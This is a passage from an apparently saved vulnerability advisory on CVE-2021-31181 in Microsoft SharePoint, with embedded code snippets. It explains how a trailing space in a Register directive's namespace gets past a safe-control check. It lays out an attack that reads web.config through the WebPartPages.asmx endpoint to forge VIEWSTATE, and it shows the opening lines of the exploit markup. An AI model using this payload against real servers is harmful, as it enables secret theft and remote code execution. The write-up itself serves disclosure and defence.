  <p class="" style="white-space:pre-wrap;">The value of the <strong>namespace</strong> attribute will be stored in <strong><em>triplet.First</em></strong>. Let’s suppose that we have <strong>Namespace="System.Web.UI.WebControls "</strong> (note the trailing space) in our <strong>Register</strong> directive, and a tag named <strong><em>XmlDataSource</em></strong>. As you can see, there are no <strong><em>Trim()</em></strong> calls for the <strong>namespace</strong> attribute. Due to the trailing space, <strong><em>VerifyControlOnSafeList </em></strong>will not be able to resolve the Type <strong>System.Web.UI.WebControls .XmlDataSource</strong> and consequently it will not be blocked. Later, though, during actual processing of the <strong>Register</strong> directive, the following code executes:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/27ddd2843c5c5aefaab968b47e1fd38e.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_35911"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_77" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/27ddd2843c5c5aefaab968b47e1fd38e..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841070" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-4-cs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-4.cs content, created by zdi-team on 03:00PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-4.cs">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Web.UI.BaseTemplateParser </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">internal</span> <span class="pl-k">override</span> <span class="pl-smi">void</span> <span class="pl-s1">ProcessDirective</span><span class="pl-kos">(</span><span class="pl-smi">string</span> <span class="pl-s1">directiveName</span><span class="pl-kos">,</span> <span class="pl-smi">IDictionary</span> <span class="pl-s1">directive</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">StringUtil</span><span class="pl-kos">.</span><span class="pl-en">EqualsIgnoreCase</span><span class="pl-kos">(</span><span class="pl-s1">directiveName</span><span class="pl-kos">,</span> <span class="pl-s">"register"</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC6" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyIdentifierAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyIdentifierAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directive</span><span class="pl-kos">,</span> <span class="pl-s">"tagprefix"</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC7" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyIdentifierAttribute2</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyIdentifierAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directive</span><span class="pl-kos">,</span> <span class="pl-s">"tagname"</span><span class="pl-kos">,</span> <span class="pl-c1">false</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC8" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">VirtualPath</span> <span class="pl-s1">andRemoveVirtualPathAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveVirtualPathAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directive</span><span class="pl-kos">,</span> <span class="pl-s">"src"</span><span class="pl-kos">,</span> <span class="pl-c1">false</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyNoSpaceAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyNoSpaceAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directive</span><span class="pl-kos">,</span> <span class="pl-s">"namespace"</span><span class="pl-kos">,</span> <span class="pl-c1">false</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directive</span><span class="pl-kos">,</span> <span class="pl-s">"assembly"</span><span class="pl-kos">,</span> <span class="pl-c1">false</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC11" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">RegisterDirectiveEntry</span> <span class="pl-s1">registerDirectiveEntry</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC12" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC13" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">TagNamespaceRegisterEntry</span> <span class="pl-s1">tagNamespaceRegisterEntry</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">TagNamespaceRegisterEntry</span><span class="pl-kos">(</span><span class="pl-s1">andRemoveNonEmptyIdentifierAttribute</span><span class="pl-kos">,</span> <span class="pl-s1">andRemoveNonEmptyNoSpaceAttribute</span><span class="pl-kos">,</span> <span class="pl-s1">andRemoveNonEmptyAttribute</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">registerDirectiveEntry</span> <span class="pl-c1">=</span> <span class="pl-s1">tagNamespaceRegisterEntry</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">base</span><span class="pl-kos">.</span><span class="pl-s1">TypeMapper</span><span class="pl-kos">.</span><span class="pl-en">ProcessTagNamespaceRegistration</span><span class="pl-kos">(</span><span class="pl-s1">tagNamespaceRegisterEntry</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC17" class="blob-code blob-code-inner js-file-line"> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC18" class="blob-code blob-code-inner js-file-line"> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Web.UI.Util </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-k">internal</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">string</span> <span class="pl-s1">GetAndRemoveNonEmptyIdentifierAttribute</span><span class="pl-kos">(</span><span class="pl-smi">IDictionary</span> <span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-smi">string</span> <span class="pl-s1">key</span><span class="pl-kos">,</span> <span class="pl-smi">bool</span> <span class="pl-s1">required</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC22" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyNoSpaceAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyNoSpaceAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-s1">key</span><span class="pl-kos">,</span> <span class="pl-s1">required</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC23" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC24" class="blob-code blob-code-inner js-file-line"> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC25" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Web.UI.Util </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-k">internal</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">string</span> <span class="pl-s1">GetAndRemoveNonEmptyNoSpaceAttribute</span><span class="pl-kos">(</span><span class="pl-smi">IDictionary</span> <span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-smi">string</span> <span class="pl-s1">key</span><span class="pl-kos">,</span> <span class="pl-smi">bool</span> <span class="pl-s1">required</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC28" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">andRemoveNonEmptyAttribute</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemoveNonEmptyAttribute</span><span class="pl-kos">(</span><span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-s1">key</span><span class="pl-kos">,</span> <span class="pl-s1">required</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC30" class="blob-code blob-code-inner js-file-line"> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC31" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Web.UI.Util </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC32" class="blob-code blob-code-inner js-file-line"><span class="pl-k">internal</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">string</span> <span class="pl-s1">GetAndRemoveNonEmptyAttribute</span><span class="pl-kos">(</span><span class="pl-smi">IDictionary</span> <span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-smi">string</span> <span class="pl-s1">key</span><span class="pl-kos">,</span> <span class="pl-smi">bool</span> <span class="pl-s1">required</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC33" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC34" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">andRemove</span> <span class="pl-c1">=</span> <span class="pl-s1">Util</span><span class="pl-kos">.</span><span class="pl-en">GetAndRemove</span><span class="pl-kos">(</span><span class="pl-s1">directives</span><span class="pl-kos">,</span> <span class="pl-s1">key</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC35" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC36" class="blob-code blob-code-inner js-file-line"> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC37" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Web.UI.Util </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC38" class="blob-code blob-code-inner js-file-line"><span class="pl-k">private</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">string</span> <span class="pl-en">GetAndRemove</span><span class="pl-kos">(</span><span class="pl-smi">IDictionary</span> <span class="pl-s1">dict</span><span class="pl-kos">,</span> <span class="pl-smi">string</span> <span class="pl-s1">key</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC39" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC40" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">dict</span><span class="pl-kos">[</span><span class="pl-s1">key</span><span class="pl-kos">]</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC41" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">text</span> <span class="pl-c1">!=</span> <span class="pl-c1">null</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC42" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC43" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">dict</span><span class="pl-kos">.</span><span class="pl-en">Remove</span><span class="pl-kos">(</span><span class="pl-s1">key</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC44" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-s1">text</span><span class="pl-kos">.</span><span class="pl-en">Trim</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC45" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC46" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-s1">text</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-4-cs-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-cve-2021-31181-snippet-4-cs-LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">}</span></td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/27ddd2843c5c5aefaab968b47e1fd38e/raw/3a61b45581054f531959687d133e2d994444e5f5/CVE-2021-31181-snippet-4.cs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/27ddd2843c5c5aefaab968b47e1fd38e#file-cve-2021-31181-snippet-4-cs" class="Link--inTextBlock">
          CVE-2021-31181-snippet-4.cs
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_36778"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">At this stage, the <strong>Namespace</strong> will be trimmed and a <strong>Type </strong>for <strong>System.Web.UI.WebControls.XmlDataSource</strong> will be successfully resolved. This means the unsafe control will be processed by the server.</p><p class="" style="white-space:pre-wrap;">For our attack, we will use the <strong><em>WebPartPagesWebService.RenderWebPartForEdit</em></strong> webapi method. It is accessible via the <strong>/_vti_bin/WebPartPages.asmx </strong>endpoint. It takes ASPX markup as an input, verifies it using <strong><em>EditingPageParser.VerifyControlOnSafeList</em></strong>,<strong><em> </em></strong>and, if there are no unsafe elements, processes the markup in Design mode. The resulting HTML will be returned to the web client.</p><p class="" style="white-space:pre-wrap;">We will use the WebPart <strong>Microsoft.SharePoint.WebPartPage.XsltListFormWebPart</strong> with our unsafe <strong>XmlDataSource, </strong>specifying a<strong> </strong>simple XSL transformation to copy the result verbatim to our output. In this way we can obtain the contents of an arbitrary XML file from the server. We choose to disclose the contents of <strong>web.config</strong>. This will provide us with the validation key needed to forge a <strong>VIEWSTATE</strong> parameter, providing a path to remote code execution.</p><p class="" style="white-space:pre-wrap;">To proceed, we will also need to provide the <strong>Title</strong> of any existing <strong>SPList</strong> from the current site, as well as the site’s<strong> webID</strong>. These can be obtained easily. We will see how to do this in the PoC section.</p><p class="" style="white-space:pre-wrap;">Here is an example of a <strong><em>RenderWebPartForEdit</em></strong> request:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/5cc6ab28b372215c41394358f9337293.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_49389"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_80" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/5cc6ab28b372215c41394358f9337293..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841209" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-5-ascx" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-asp-net  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-5.ascx content, created by zdi-team on 03:06PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-5.ascx">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-s1"><span class="pl-pse">&lt;%</span>@ Register TagPrefix<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>WebPartPages<span class="pl-pds">"</span></span> Namespace<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>Microsoft.SharePoint.WebPartPage<span class="pl-pds">"</span></span> Assembly<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c<span class="pl-pds">"</span></span> <span class="pl-pse">%&gt;</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-s1"><span class="pl-pse">&lt;%</span>@Register TagPrefix<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>att<span class="pl-pds">"</span></span> Namespace<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>System.Web.UI.WebControls <span class="pl-pds">"</span></span> Assembly<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a<span class="pl-pds">"</span></span><span class="pl-pse">%&gt;</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC3" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">WebPartPages:XsltListFormWebPart</span> <span class="pl-e">id</span>=<span class="pl-s"><span class="pl-pds">"</span>id01<span class="pl-pds">"</span></span> <span class="pl-e">runat</span>=<span class="pl-s"><span class="pl-pds">"</span>server<span class="pl-pds">"</span></span> <span class="pl-e">ListDisplayName</span>=<span class="pl-s"><span class="pl-pds">"</span>Documents<span class="pl-pds">"</span></span> <span class="pl-e">WebId</span>=<span class="pl-s"><span class="pl-pds">"</span>{6e7040c8-0338-4448-914d-a7061e0fc347}<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC4" class="blob-code blob-code-inner js-file-line">  &lt;<span class="pl-ent">DataSources</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC5" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">att:xmldatasource</span> <span class="pl-e">runat</span>=<span class="pl-s"><span class="pl-pds">"</span>server<span class="pl-pds">"</span></span> <span class="pl-e">id</span>=<span class="pl-s"><span class="pl-pds">"</span>XDS1<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
